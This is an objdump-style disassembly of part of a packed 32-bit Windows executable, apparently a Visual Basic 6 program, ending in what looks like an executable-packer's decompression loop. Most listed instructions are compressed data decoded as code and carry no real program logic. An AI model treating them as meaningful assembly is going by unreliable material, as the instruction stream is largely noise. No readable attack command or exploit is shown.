  414684:	cd fb                	int    $0xfb
  414686:	0e                   	push   %cs
  414687:	d0 0c c3             	rorb   $1,(%ebx,%eax,8)
  41468a:	4e                   	dec    %esi
  41468b:	27                   	daa
  41468c:	fb                   	sti
  41468d:	38 76 d8             	cmp    %dh,-0x28(%esi)
  414690:	ae                   	scas   %es:(%edi),%al
  414691:	ad                   	lods   %ds:(%esi),%eax
  414692:	64 c2 d8 17          	fs ret $0x17d8
  414696:	38 07                	cmp    %al,(%edi)
  414698:	5e                   	pop    %esi
  414699:	03 72 46             	add    0x46(%edx),%esi
  41469c:	ac                   	lods   %ds:(%esi),%al
  41469d:	0f 6a 17             	punpckhdq (%edi),%mm2
  4146a0:	60                   	pusha
  4146a1:	50                   	push   %eax
  4146a2:	50                   	push   %eax
  4146a3:	c2 61 08             	ret    $0x861
  4146a6:	f6 20                	mulb   (%eax)
  4146a8:	f2 b6 84             	repnz mov $0x84,%dh
  4146ab:	00 c8                	add    %cl,%al
  4146ad:	97                   	xchg   %eax,%edi
  4146ae:	43                   	inc    %ebx
  4146af:	14 50                	adc    $0x50,%al
  4146b1:	46                   	inc    %esi
  4146b2:	0f c2 1a f3          	cmpps  $0xf3,(%edx),%xmm3
  4146b6:	44                   	inc    %esp
  4146b7:	00 b0 1f 34 cd 00    	add    %dh,0xcd341f(%eax)
  4146bd:	c2 60 f7             	ret    $0xf760
  4146c0:	50                   	push   %eax
  4146c1:	38 3c 04             	cmp    %bh,(%esp,%eax,1)
  4146c4:	77 1a                	ja     0x4146e0
  4146c6:	96                   	xchg   %eax,%esi
  4146c7:	3e 0a d0             	ds or  %al,%dl
  4146ca:	9c                   	pushf
  4146cb:	f5                   	cmc
  4146cc:	ea 1c b0 c9 6e 4f a0 	ljmp   $0xa04f,$0x6ec9b01c
  4146d3:	40                   	inc    %eax
  4146d4:	aa                   	stos   %al,%es:(%edi)
  4146d5:	80 cb 90             	or     $0x90,%bl
  4146d8:	da ef                	(bad)
  4146da:	b9 49 4e 6a 66       	mov    $0x666a4e49,%ecx
  4146df:	58                   	pop    %eax
  4146e0:	03 ff                	add    %edi,%edi
  4146e2:	14 3e                	adc    $0x3e,%al
  4146e4:	4e                   	dec    %esi
  4146e5:	96                   	xchg   %eax,%esi
  4146e6:	97                   	xchg   %eax,%edi
  4146e7:	10 0b                	adc    %cl,(%ebx)
  4146e9:	00 24 54             	add    %ah,(%esp,%edx,2)
  4146ec:	14 27                	adc    $0x27,%al
  4146ee:	54                   	push   %esp
  4146ef:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4146f0:	09 ce                	or     %ecx,%esi
  4146f2:	58                   	pop    %eax
  4146f3:	60                   	pusha
  4146f4:	fd                   	std
  4146f5:	58                   	pop    %eax
  4146f6:	ba 60 c1 7b 2b       	mov    $0x2b7bc160,%edx
  4146fb:	19 9d 37 2f c8 03    	sbb    %ebx,0x3c82f37(%ebp)
  414701:	3f                   	aas
  414702:	26 ba 78 71 50 f1    	es mov $0xf1507178,%edx
  414708:	50                   	push   %eax
  414709:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  41470b:	eb 72                	jmp    0x41477f
  41470d:	03 4b 80             	add    -0x80(%ebx),%ecx
  414710:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414711:	4a                   	dec    %edx
  414712:	03 83 db 1b 72 f6    	add    -0x98de425(%ebx),%eax
  414718:	23 86 18 4e 14 18    	and    0x18144e18(%esi),%eax
  41471e:	92                   	xchg   %eax,%edx
  41471f:	2d d6 64 86 18       	sub    $0x188664d6,%eax
  414724:	86 8e 1c 5b 46 ce    	xchg   %cl,-0x31b9a4e4(%esi)
  41472a:	3e 1e                	ds push %ds
  41472c:	9e                   	sahf
  41472d:	01 5b 04             	add    %ebx,0x4(%ebx)
  414730:	51                   	push   %ecx
  414731:	3d 0a c8 41 76       	cmp    $0x7641c80a,%eax
  414736:	17                   	pop    %ss
  414737:	5c                   	pop    %esp
  414738:	50                   	push   %eax
  414739:	59                   	pop    %ecx
  41473a:	54                   	push   %esp
  41473b:	59                   	pop    %ecx
  41473c:	4c                   	dec    %esp
  41473d:	32 99 e9 0d 4c 51    	xor    0x514c0de9(%ecx),%bl
  414743:	ff 4d 03             	decl   0x3(%ebp)
  414746:	60                   	pusha
  414747:	7f c8                	jg     0x414711
  414749:	32 9e 3f fc 13 fd    	xor    -0x2ec03c1(%esi),%bl
  41474f:	c2 4a a9             	ret    $0xa94a
  414752:	82 33 66             	xorb   $0x66,(%ebx)
  414755:	47                   	inc    %edi
  414756:	54                   	push   %esp
  414757:	4f                   	dec    %edi
  414758:	37                   	aaa
  414759:	60                   	pusha
  41475a:	0b e4                	or     %esp,%esp
  41475c:	90                   	nop
  41475d:	c1 5c b8 c1 3a       	rcrl   $0x3a,-0x3f(%eax,%edi,4)
  414762:	59                   	pop    %ecx
  414763:	20 09                	and    %cl,(%ecx)
  414765:	3c fb                	cmp    $0xfb,%al
  414767:	15 18 2d 40 88       	adc    $0x88402d18,%eax
  41476c:	25 73 dc bf 47       	and    $0x47bfdc73,%eax
  414771:	12 9d 08 43 67 1c    	adc    0x1c674308(%ebp),%bl
  414777:	6e                   	outsb  %ds:(%esi),(%dx)
  414778:	30 22                	xor    %ah,(%edx)
  41477a:	27                   	daa
  41477b:	1c 04                	sbb    $0x4,%al
  41477d:	f5                   	cmc
  41477e:	63 0f                	arpl   %ecx,(%edi)
  414780:	b9 c8 41 12 51       	mov    $0x511241c8,%ecx
  414785:	a1 80 d9 fe 36       	mov    0x36fed980,%eax
  41478a:	fb                   	sti
  41478b:	08 28                	or     %ch,(%eax)
  41478d:	08 ff                	or     %bh,%bh
  41478f:	50                   	push   %eax
  414790:	1b c7                	sbb    %edi,%eax
  414792:	ff 52 28             	call   *0x28(%edx)
  414795:	f8                   	clc
  414796:	fe 4b 0d             	decb   0xd(%ebx)
  414799:	01 e5                	add    %esp,%ebp
  41479b:	43                   	inc    %ebx
  41479c:	96                   	xchg   %eax,%esi
  41479d:	0f e8 fe             	psubsb %mm6,%mm7
  4147a0:	05 02 d8 fe 06       	add    $0x6fed802,%eax
  4147a5:	39 64 f9 90          	cmp    %esp,-0x70(%ecx,%edi,8)
  4147a9:	03 c8                	add    %eax,%ecx
  4147ab:	fe 00                	incb   (%eax)
  4147ad:	04 b8                	add    $0xb8,%al
  4147af:	39 e4                	cmp    %esp,%esp
  4147b1:	39 e4                	cmp    %esp,%esp
  4147b3:	05 a8 06 98 39       	add    $0x399806a8,%eax
  4147b8:	e4 39                	in     $0x39,%al
  4147ba:	e4 07                	in     $0x7,%al
  4147bc:	88 08                	mov    %cl,(%eax)
  4147be:	78 39                	js     0x4147f9
  4147c0:	e4 39                	in     $0x39,%al
  4147c2:	e4 09                	in     $0x9,%al
  4147c4:	68 0a 58 39 e4       	push   $0xe439580a
  4147c9:	39 e4                	cmp    %esp,%esp
  4147cb:	0b 48 0c             	or     0xc(%eax),%ecx
  4147ce:	38 39                	cmp    %bh,(%ecx)
  4147d0:	e4 39                	in     $0x39,%al
  4147d2:	e4 0d                	in     $0xd,%al
  4147d4:	28 0e                	sub    %cl,(%esi)
  4147d6:	18 9c ec 39 e4 0f 08 	sbb    %bl,0x80fe439(%esp,%ebp,8)
  4147dd:	10 df                	adc    %bl,%bh
  4147df:	fd                   	std
  4147e0:	00 97 ec 4b b2 11    	add    %dl,0x11b24bec(%edi)
  4147e6:	0d 12 df 0d 2f       	or     $0x2f0ddf12,%eax
  4147eb:	49                   	dec    %ecx
  4147ec:	33 d9                	xor    %ecx,%ebx
  4147ee:	13 df                	adc    %edi,%ebx
  4147f0:	fd                   	std
  4147f1:	14 0d                	adc    $0xd,%al
  4147f3:	54                   	push   %esp
  4147f4:	07                   	pop    %es
  4147f5:	43                   	inc    %ebx
  4147f6:	90                   	nop
  4147f7:	15 40 5f 61 07       	adc    $0x7615f40,%eax
  4147fc:	b8 ed 59 0a 5a       	mov    $0x5a0a59ed,%eax
  414801:	0b c2                	or     %edx,%eax
  414803:	00 1e                	add    %bl,(%esi)
  414805:	2f                   	das
  414806:	f1                   	int1
  414807:	ff 80 97 f2 70 35    	incl   0x3570f297(%eax)
  41480d:	49                   	dec    %ecx
  41480e:	f4                   	hlt
  41480f:	01 fc                	add    %edi,%esp
  414811:	cb                   	lret
  414812:	fd                   	std
  414813:	69 01 16 be 00 9f    	imul   $0x9f00be16,(%ecx),%eax
  414819:	68 98 fd de 52       	push   $0x52defd98
  41481e:	31 94 c3 9d 8b 5c 1b 	xor    %edx,0x1b5c8b9d(%ebx,%eax,8)
  414825:	80 1f fe             	sbbb   $0xfe,(%edi)
  414828:	ae                   	scas   %es:(%edi),%al
  414829:	1c b6                	sbb    $0xb6,%al
  41482b:	3f                   	aas
  41482c:	16                   	push   %ss
  41482d:	5d                   	pop    %ebp
  41482e:	02 c3                	add    %bl,%al
  414830:	88 fd                	mov    %bh,%ch
  414832:	d8 88 fd fb ef 78    	fmuls  0x78effbfd(%eax)
  414838:	f2 65 79 f3          	bnd gs jns 0x41482f
  41483c:	fd                   	std
  41483d:	fc                   	cld
  41483e:	f6 4c 1c ff 88       	testb  $0x88,-0x1(%esp,%ebx,1)
  414843:	fd                   	std
  414844:	3c 98                	cmp    $0x98,%al
  414846:	fd                   	std
  414847:	a2 01 e5 7f 72       	mov    %al,0x727fe501
  41484c:	72 08                	jb     0x414856
  41484e:	1c 68                	sbb    $0x68,%al
  414850:	fd                   	std
  414851:	04 68                	add    $0x68,%al
  414853:	fd                   	std
  414854:	71 64                	jno    0x4148ba
  414856:	fd                   	std
  414857:	21 79 c9             	and    %edi,-0x37(%ecx)
  41485a:	91                   	xchg   %eax,%ecx
  41485b:	4c                   	dec    %esp
  41485c:	64 fd                	fs std
  41485e:	64 fd                	fs std
  414860:	8c 1f                	mov    %ds,(%edi)
  414862:	8b cc                	mov    %esp,%ecx
  414864:	64 fd                	fs std
  414866:	d7                   	xlat   %ds:(%ebx)
  414867:	18 02                	sbb    %al,(%edx)
  414869:	2c 02                	sub    $0x2,%al
  41486b:	44                   	inc    %esp
  41486c:	63 7b 21             	arpl   %edi,0x21(%ebx)
  41486f:	00 67 66             	add    %ah,0x66(%edi)
  414872:	4f                   	dec    %edi
  414873:	a8 fd                	test   $0xfd,%al
  414875:	60                   	pusha
  414876:	3a a9 9a 6e 98 03    	cmp    0x3986e9a(%ecx),%ch
  41487c:	68 3c af 6c 2d       	push   $0x2d6caf3c
  414881:	8b e5                	mov    %ebp,%esp
  414883:	2c df                	sub    $0xdf,%al
  414885:	2c 22                	sub    $0x22,%al
  414887:	73 9a                	jae    0x414823
  414889:	a8 99                	test   $0x99,%al
  41488b:	cd ac                	int    $0xac
  41488d:	27                   	daa
  41488e:	88 bd e7 05 c3 7d    	mov    %bh,0x7dc305e7(%ebp)
  414894:	f1                   	int1
  414895:	08 cb                	or     %cl,%bl
  414897:	79 63                	jns    0x4148fc
  414899:	85 ef                	test   %ebp,%edi
  41489b:	a0 4c 19 40 1e       	mov    0x1e40194c,%al
  4148a0:	7c b9                	jl     0x41485b
  4148a2:	a0 54 0e e1 bd       	mov    0xbde10e54,%al
  4148a7:	e5 99                	in     $0x99,%eax
  4148a9:	4b                   	dec    %ebx
  4148aa:	be 52 b4 0a 05       	mov    $0x50ab452,%esi
  4148af:	06                   	push   %es
  4148b0:	77 5b                	ja     0x41490d
  4148b2:	b0 d4                	mov    $0xd4,%al
  4148b4:	07                   	pop    %es
  4148b5:	3a 16                	cmp    (%esi),%dl
  4148b7:	07                   	pop    %es
  4148b8:	0c 40                	or     $0x40,%al
  4148ba:	15 1c 64 00 ba       	adc    $0xba00641c,%eax
  4148bf:	a0 3d 60 18 fd       	mov    0xfd18603d,%al
  4148c4:	fe 40 0b             	incb   0xb(%eax)
  4148c7:	16                   	push   %ss
  4148c8:	2f                   	das
  4148c9:	f2 31 00             	repnz xor %eax,(%eax)
  4148cc:	d7                   	xlat   %ds:(%ebx)
  4148cd:	07                   	pop    %es
  4148ce:	1c 8b                	sbb    $0x8b,%al
  4148d0:	2c ff                	sub    $0xff,%al
  4148d2:	04 40                	add    $0x40,%al
  4148d4:	d4 85                	aam    $0x85
  4148d6:	ce                   	into
  4148d7:	10 09                	adc    %cl,(%ecx)
  4148d9:	82 3e 2c             	cmpb   $0x2c,(%esi)
  4148dc:	27                   	daa
  4148dd:	1b c0                	sbb    %eax,%eax
  4148df:	b2 58                	mov    $0x58,%dl
  4148e1:	3c 40                	cmp    $0x40,%al
  4148e3:	8b 38                	mov    (%eax),%edi
  4148e5:	34 34                	xor    $0x34,%al
  4148e7:	37                   	aaa
  4148e8:	03 78 71             	add    0x71(%eax),%edi
  4148eb:	8b e9                	mov    %ecx,%ebp
  4148ed:	1a c3                	sbb    %bl,%al
  4148ef:	5c                   	pop    %esp
  4148f0:	6b 1d 7f ff 29 28 a1 	imul   $0xffffffa1,0x2829ff7f,%ebx
  4148f7:	5b                   	pop    %ebx
  4148f8:	ce                   	into
  4148f9:	7d ed                	jge    0x4148e8
  4148fb:	b7 23                	mov    $0x23,%bh
  4148fd:	15 21 0f fc 02       	adc    $0x2fc0f21,%eax
  414902:	19 11                	sbb    %edx,(%ecx)
  414904:	51                   	push   %ecx
  414905:	ac                   	lods   %ds:(%esi),%al
  414906:	2b 78 c0             	sub    -0x40(%eax),%edi
  414909:	8e 64 72 1f          	mov    0x1f(%edx,%esi,2),%fs
  41490d:	2c 68                	sub    $0x68,%al
  41490f:	04 1a                	add    $0x1a,%al
  414911:	1f                   	pop    %ds
  414912:	78 2f                	js     0x414943
  414914:	b4 e6                	mov    $0xe6,%ah
  414916:	b0 6b                	mov    $0x6b,%al
  414918:	11 fd                	adc    %edi,%ebp
  41491a:	ad                   	lods   %ds:(%esi),%eax
  41491b:	44                   	inc    %esp
  41491c:	08 25 60 db bb 54    	or     %ah,0x54bbdb60
  414922:	fe                   	(bad)
  414923:	37                   	aaa
  414924:	d4 01                	aam    $0x1
  414926:	9c                   	pushf
  414927:	29 55 27             	sub    %edx,0x27(%ebp)
  41492a:	26 1b 34 33          	sbb    %es:(%ebx,%esi,1),%esi
  41492e:	c0 8a 71 0d 24 20 85 	rorb   $0x85,0x20240d71(%edx)
  414935:	c5 51 25             	lds    0x25(%ecx),%edx
  414938:	f2 ab                	repnz stos %eax,%es:(%edi)
  41493a:	10 16                	adc    %dl,(%esi)
  41493c:	19 40 4e             	sbb    %eax,0x4e(%eax)
  41493f:	38 e4                	cmp    %ah,%ah
  414941:	84 48 80             	test   %cl,-0x80(%eax)
  414944:	ef                   	out    %eax,(%dx)
  414945:	12 30                	adc    (%eax),%dh
  414947:	07                   	pop    %es
  414948:	c9                   	leave
  414949:	c2 2b 04             	ret    $0x42b
  41494c:	78 0c                	js     0x41495a
  41494e:	30 0a                	xor    %cl,(%edx)
  414950:	d9 dc                	(bad)
  414952:	84 25 0a 6f ca 7e    	test   %ah,0x7eca6f0a
  414958:	87 cf                	xchg   %ecx,%edi
  41495a:	95                   	xchg   %eax,%ebp
  41495b:	70 09                	jo     0x414966
  41495d:	01 a2 33 34 02 c6    	add    %esp,-0x39fdcbcd(%edx)
  414963:	6b eb ec             	imul   $0xffffffec,%ebx,%ebp
  414966:	92                   	xchg   %eax,%edx
  414967:	0e                   	push   %cs
  414968:	0f 0a                	(bad)
  41496a:	27                   	daa
  41496b:	0c 27                	or     $0x27,%al
  41496d:	2b 30                	sub    (%eax),%esi
  41496f:	e8 52 61 3a 0b       	call   0xb7baac6
  414974:	83 4e 44 ca          	orl    $0xffffffca,0x44(%esi)
  414978:	03 38                	add    (%eax),%edi
  41497a:	6b dd 39             	imul   $0x39,%ebp,%ebx
  41497d:	11 0f                	adc    %ecx,(%edi)
  41497f:	28 12                	sub    %dl,(%edx)
  414981:	5a                   	pop    %edx
  414982:	04 ad                	add    $0xad,%al
  414984:	b5 16                	mov    $0x16,%ch
  414986:	09 1b                	or     %ebx,(%ebx)
  414988:	28 2d 58 46 ae 2b    	sub    %ch,0x2bae4658
  41498e:	b7 b7                	mov    $0xb7,%bh
  414990:	34 99                	xor    $0x99,%al
  414992:	ad                   	lods   %ds:(%esi),%eax
  414993:	ad                   	lods   %ds:(%esi),%eax
  414994:	5c                   	pop    %esp
  414995:	60                   	pusha
  414996:	21 b3 0c 2b a0 fe    	and    %esi,-0x15fd4f4(%ebx)
  41499c:	03 83 9d 36 f7 71    	add    0x71f7369d(%ebx),%eax
  4149a2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4149a3:	fe                   	(bad)
  4149a4:	2f                   	das
  4149a5:	d7                   	xlat   %ds:(%ebx)
  4149a6:	08 0b                	or     %cl,(%ebx)
  4149a8:	8f                   	(bad)
  4149a9:	fe 4c e1 b0          	decb   -0x50(%ecx,%eiz,8)
  4149ad:	2b 10                	sub    (%eax),%edx
  4149af:	56                   	push   %esi
  4149b0:	1b f5                	sbb    %ebp,%esi
  4149b2:	b7 26                	mov    $0x26,%bh
  4149b4:	23 e7                	and    %edi,%esp
  4149b6:	7b 6a                	jnp    0x414a22
  4149b8:	fb                   	sti
  4149b9:	90                   	nop
  4149ba:	02 6c 27 0a          	add    0xa(%edi,%eiz,1),%ch
  4149be:	d3 3c 08             	sarl   %cl,(%eax,%ecx,1)
  4149c1:	18 85 ba 59 c0 fc    	sbb    %al,-0x33fa646(%ebp)
  4149c7:	c8 5b 0c dc          	enter  $0xc5b,$0xdc
  4149cb:	7b 38                	jnp    0x414a05
  4149cd:	90                   	nop
  4149ce:	4a                   	dec    %edx
  4149cf:	c8 02 34 47          	enter  $0x3402,$0x47
  4149d3:	e8 15 03 68 2d       	call   0x2da94ced
  4149d8:	1f                   	pop    %ds
  4149d9:	eb 9f                	jmp    0x41497a
  4149db:	11 f9                	adc    %edi,%ecx
  4149dd:	0a 1e                	or     (%esi),%bl
  4149df:	cb                   	lret
  4149e0:	87 0b                	xchg   %ecx,(%ebx)
  4149e2:	2c 5b                	sub    $0x5b,%al
  4149e4:	c0 3b 87             	sarb   $0x87,(%ebx)
  4149e7:	13 6b 34             	adc    0x34(%ebx),%ebp
  4149ea:	30 b3 b5 72 b2 2c    	xor    %dh,0x2cb272b5(%ebx)
  4149f0:	64 c5 3b             	lds    %fs:(%ebx),%edi
  4149f3:	c8 99 01 33          	enter  $0x199,$0x33
  4149f7:	55                   	push   %ebp
  4149f8:	a8 f3                	test   $0xf3,%al
  4149fa:	00 e9                	add    %ch,%cl
  4149fc:	3c 20                	cmp    $0x20,%al
  4149fe:	dd 81 0f 9e 00 00    	fldl   0x9e0f(%ecx)
  414a04:	20 b2 00 4c 08 22    	and    %dh,0x22084c00(%edx)
  414a0a:	85 9b c9 64 32 99    	test   %ebx,-0x66cd9b37(%ebx)
  414a10:	99                   	cltd
  414a11:	4c                   	dec    %esp
  414a12:	26 93                	es xchg %eax,%ebx
  414a14:	9c                   	pushf
  414a15:	c9                   	leave
  414a16:	64 32 82 ce 39 e7 d6 	xor    %fs:-0x2918c632(%edx),%al
  414a1d:	2a 2a                	sub    (%edx),%ch
  414a1f:	90                   	nop
  414a20:	99                   	cltd
  414a21:	f2 90                	repnz nop
  414a23:	44                   	inc    %esp
  414a24:	40                   	inc    %eax
  414a25:	45                   	inc    %ebp
  414a26:	15 c8 00 aa 2a       	adc    $0x2aaa00c8,%eax
  414a2b:	90                   	nop
  414a2c:	51                   	push   %ecx
  414a2d:	00 44 60 a3          	add    %al,-0x5d(%eax,%eiz,2)
  414a31:	00 15 ff 0f 72 54    	add    %dl,0x54720fff
  414a37:	65 01 4d 65          	add    %ecx,%gs:0x65(%ebp)
  414a3b:	74 68                	je     0x414aa5
  414a3d:	43                   	inc    %ebx
  414a3e:	61                   	popa
  414a3f:	6c                   	insb   (%dx),%es:(%edi)
  414a40:	6c                   	insb   (%dx),%es:(%edi)
  414a41:	45                   	inc    %ebp
  414a42:	6e                   	outsb  %ds:(%esi),(%dx)
  414a43:	96                   	xchg   %eax,%esi
  414a44:	65 fb                	gs sti
  414a46:	e5 67                	in     $0x67,%eax
  414a48:	69 6e ff 51 02 ff 52 	imul   $0x52ff0251,-0x1(%esi),%ebp
  414a4f:	02 53 56             	add    0x56(%ebx),%dl
  414a52:	0d 6d ff ff 5f       	or     $0x5fffff6d,%eax
  414a57:	0e                   	push   %cs
  414a58:	02 01                	add    (%ecx),%al
  414a5a:	45                   	inc    %ebp
  414a5b:	56                   	push   %esi
  414a5c:	45                   	inc    %ebp
  414a5d:	4e                   	dec    %esi
  414a5e:	54                   	push   %esp
  414a5f:	5f                   	pop    %edi
  414a60:	53                   	push   %ebx
  414a61:	49                   	dec    %ecx
  414a62:	4e                   	dec    %esi
  414a63:	4b                   	dec    %ebx
  414a64:	5f                   	pop    %edi
  414a65:	41                   	inc    %ecx
  414a66:	64 64 52             	fs fs push %edx
  414a69:	65 66 24 11          	gs data16 and $0x11,%al
  414a6d:	b6 bd                	mov    $0xbd,%dh
  414a6f:	ff b6 15 44 32 46    	push   0x46324415(%esi)
  414a75:	75 6e                	jne    0x414ae5
  414a77:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  414a7b:	6e                   	outsb  %ds:(%esi),(%dx)
  414a7c:	3e 13 9e 29 db a4 28 	adc    %ds:0x28a4db29(%esi),%ebx
  414a83:	12 2f                	adc    (%edi),%ch
  414a85:	16                   	push   %ss
  414a86:	58                   	pop    %eax
  414a87:	0b 8a 84 6c 43 59    	or     0x59436c84(%edx),%ecx
  414a8d:	22 db                	and    %bl,%bl
  414a8f:	7f 7b                	jg     0x414b0c
  414a91:	fb                   	sti
  414a92:	49                   	dec    %ecx
  414a93:	6e                   	outsb  %ds:(%esi),(%dx)
  414a94:	74 05                	je     0x414a9b
  414a96:	66 61                	popaw
  414a98:	63 20                	arpl   %esp,(%eax)
  414a9a:	01 5f 5f             	add    %ebx,0x5f(%edi)
  414a9d:	76 62                	jbe    0x414b01
  414a9f:	61                   	popa
  414aa0:	45                   	inc    %ebp
  414aa1:	78 0a                	js     0x414aad
  414aa3:	70 65                	jo     0x414b0a
  414aa5:	1b 29                	sbb    (%ecx),%ebp
  414aa7:	8a 74 17 72          	mov    0x72(%edi,%edx,1),%dh
  414aab:	34 5f                	xor    $0x5f,%al
  414aad:	55                   	push   %ebp
  414aae:	44                   	inc    %esp
  414aaf:	d9 b6 60 02 12 3a    	fnstenv 0x3a120260(%esi)
  414ab5:	cc                   	int3
  414ab6:	65 5b                	gs pop %ebx
  414ab8:	0e                   	push   %cs
  414ab9:	cc                   	int3
  414aba:	23 a0 19 85 02 3a    	and    0x3a028519(%eax),%esp
  414ac0:	96                   	xchg   %eax,%esi
  414ac1:	6d                   	insl   (%dx),%es:(%edi)
  414ac2:	d9 96 ad 64 0e 68    	fsts   0x680e64ad(%esi)
  414ac8:	1e                   	push   %ds
  414ac9:	02 21                	add    (%ecx),%ah
  414acb:	22 97 63 74 59 23    	and    0x23597463(%edi),%dl
  414ad1:	44                   	inc    %esp
  414ad2:	02 4a 50             	add    0x50(%edx),%cl
  414ad5:	45                   	inc    %ebp
  414ad6:	4c                   	dec    %esp
  414ad7:	01 b3 fd 87 fc 03    	add    %esi,0x3fc87fd(%ebx)
  414add:	00 c6                	add    %al,%dh
  414adf:	d7                   	xlat   %ds:(%ebx)
  414ae0:	62 49 e0             	bound  %ecx,-0x20(%ecx)
  414ae3:	00 0f                	add    %cl,(%edi)
  414ae5:	01 0b                	add    %ecx,(%ebx)
  414ae7:	01 06                	add    %eax,(%esi)
  414ae9:	0c b0                	or     $0xb0,%al
  414aeb:	9d                   	popf
  414aec:	fc                   	cld
  414aed:	01 41 70             	add    %eax,0x70(%ecx)
  414af0:	bb 00 50 11 c0       	mov    $0xc0115000,%ebx
  414af5:	24 10                	and    $0x10,%al
  414af7:	71 f6                	jno    0x414aef
  414af9:	0d 40 0b 10 b2       	or     $0xb2100b40,%eax
  414afe:	ac                   	lods   %ds:(%esi),%al
  414aff:	1d 7b d8 04 3c       	sbb    $0x3c04d87b,%eax
  414b04:	30 01                	xor    %al,(%ecx)
  414b06:	17                   	pop    %ss
  414b07:	e3 80                	jecxz  0x414a89
  414b09:	07                   	pop    %es
  414b0a:	61                   	popa
  414b0b:	29 aa 65 ef 10 02    	sub    %ebp,0x210ef65(%edx)
  414b11:	07                   	pop    %es
  414b12:	ba d4 3d db 0b       	mov    $0xbdb3dd4,%edx
  414b17:	74 b1                	je     0x414aca
  414b19:	08 28                	or     %ch,(%eax)
  414b1b:	d0 02                	rolb   $1,(%edx)
  414b1d:	5b                   	pop    %ebx
  414b1e:	83 75 57 65          	xorl   $0x65,0x57(%ebp)
  414b22:	cc                   	int3
  414b23:	28 74 20 64          	sub    %dh,0x64(%eax,%eiz,1)
  414b27:	84 fb                	test   %bh,%bl
  414b29:	2e 0c 64             	cs or  $0x64,%al
  414b2c:	27                   	daa
  414b2d:	2e 56                	cs push %esi
  414b2f:	78 74                	js     0x414ba5
  414b31:	ce                   	into
  414b32:	a2 90 7f 6c c8       	mov    %al,0xc86c7f90
  414b37:	06                   	push   %es
  414b38:	b0 98                	mov    $0x98,%al
  414b3a:	00 47 60             	add    %al,0x60(%edi)
  414b3d:	2e 64 61             	cs fs popa
  414b40:	74 61                	je     0x414ba3
  414b42:	60                   	pusha
  414b43:	31 00                	xor    %eax,(%eax)
  414b45:	32 be 4b e6 7b df    	xor    -0x208419b5(%esi),%bh
  414b4b:	5d                   	pop    %ebp
  414b4c:	40                   	inc    %eax
  414b4d:	19 2e                	sbb    %ebp,(%esi)
  414b4f:	72 73                	jb     0x414bc4
  414b51:	72 63                	jb     0x414bb6
  414b53:	c6 c3 d0             	mov    $0xd0,%bl
  414b56:	2b 02                	sub    (%edx),%eax
  414b58:	b7 b2                	mov    $0xb2,%bh
  414b5a:	60                   	pusha
  414b5b:	2f                   	das
  414b5c:	27                   	daa
  414b5d:	6b 00 00             	imul   $0x0,(%eax),%eax
  414b60:	6e                   	outsb  %ds:(%esi),(%dx)
  414b61:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414b62:	00 df                	add    %bl,%bh
  414b64:	09 04 00             	or     %eax,(%eax,%eax,1)
  414b67:	00 00                	add    %al,(%eax)
  414b69:	00 00                	add    %al,(%eax)
  414b6b:	00 80 ff 00 00 60    	add    %al,0x600000ff(%eax)
  414b71:	be 00 10 41 00       	mov    $0x411000,%esi
  414b76:	8d be 00 00 ff ff    	lea    -0x10000(%esi),%edi
  414b7c:	57                   	push   %edi
  414b7d:	eb 0b                	jmp    0x414b8a
  414b7f:	90                   	nop
  414b80:	8a 06                	mov    (%esi),%al
  414b82:	46                   	inc    %esi
  414b83:	88 07                	mov    %al,(%edi)
  414b85:	47                   	inc    %edi
  414b86:	01 db                	add    %ebx,%ebx
  414b88:	75 07                	jne    0x414b91
  414b8a:	8b 1e                	mov    (%esi),%ebx
  414b8c:	83 ee fc             	sub    $0xfffffffc,%esi
  414b8f:	11 db                	adc    %ebx,%ebx
  414b91:	72 ed                	jb     0x414b80
  414b93:	b8 01 00 00 00       	mov    $0x1,%eax
  414b98:	01 db                	add    %ebx,%ebx
  414b9a:	75 07                	jne    0x414ba3
  414b9c:	8b 1e                	mov    (%esi),%ebx
  414b9e:	83 ee fc             	sub    $0xfffffffc,%esi
  414ba1:	11 db                	adc    %ebx,%ebx
  414ba3:	11 c0                	adc    %eax,%eax
  414ba5:	01 db                	add    %ebx,%ebx
  414ba7:	73 ef                	jae    0x414b98
  414ba9:	75 09                	jne    0x414bb4
  414bab:	8b 1e                	mov    (%esi),%ebx
  414bad:	83 ee fc             	sub    $0xfffffffc,%esi
  414bb0:	11 db                	adc    %ebx,%ebx
  414bb2:	73 e4                	jae    0x414b98
  414bb4:	31 c9                	xor    %ecx,%ecx
  414bb6:	83 e8 03             	sub    $0x3,%eax
  414bb9:	72 0d                	jb     0x414bc8
  414bbb:	c1 e0 08             	shl    $0x8,%eax
  414bbe:	8a 06                	mov    (%esi),%al
  414bc0:	46                   	inc    %esi
  414bc1:	83 f0 ff             	xor    $0xffffffff,%eax
  414bc4:	74 74                	je     0x414c3a
  414bc6:	89 c5                	mov    %eax,%ebp
  414bc8:	01 db                	add    %ebx,%ebx
  414bca:	75 07                	jne    0x414bd3
  414bcc:	8b 1e                	mov    (%esi),%ebx
  414bce:	83 ee fc             	sub    $0xfffffffc,%esi
  414bd1:	11 db                	adc    %ebx,%ebx
  414bd3:	11 c9                	adc    %ecx,%ecx
  414bd5:	01 db                	add    %ebx,%ebx
  414bd7:	75 07                	jne    0x414be0
  414bd9:	8b 1e                	mov    (%esi),%ebx
  414bdb:	83 ee fc             	sub    $0xfffffffc,%esi
  414bde:	11 db                	adc    %ebx,%ebx
  414be0:	11 c9                	adc    %ecx,%ecx
  414be2:	75 20                	jne    0x414c04
  414be4:	41                   	inc    %ecx
  414be5:	01 db                	add    %ebx,%ebx
  414be7:	75 07                	jne    0x414bf0
  414be9:	8b 1e                	mov    (%esi),%ebx
  414beb:	83 ee fc             	sub    $0xfffffffc,%esi
  414bee:	11 db                	adc    %ebx,%ebx
  414bf0:	11 c9                	adc    %ecx,%ecx
  414bf2:	01 db                	add    %ebx,%ebx
  414bf4:	73 ef                	jae    0x414be5
  414bf6:	75 09                	jne    0x414c01
  414bf8:	8b 1e                	mov    (%esi),%ebx
  414bfa:	83 ee fc             	sub    $0xfffffffc,%esi
  414bfd:	11 db                	adc    %ebx,%ebx
  414bff:	73 e4                	jae    0x414be5
  414c01:	83 c1 02             	add    $0x2,%ecx
  414c04:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  414c0a:	83 d1 01             	adc    $0x1,%ecx
